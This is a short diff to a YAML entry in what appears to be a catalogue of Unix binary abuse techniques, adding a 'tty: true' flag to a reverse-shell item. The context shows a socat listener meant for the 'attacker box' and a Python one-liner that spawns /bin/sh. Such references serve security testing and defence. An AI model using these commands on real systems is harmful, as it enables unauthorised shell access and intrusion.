@@ -52,6 +52,7 @@ functions:
         socat file:/dev/tty,raw,echo=0 tcp-listen:12345
       comment: |-
         A TCP server with TTY support can be used on the attacker box to receive the shell.
+    tty: true
   shell:
   - code: |-
       python -c 'import os; os.execl("/bin/sh", "sh")'
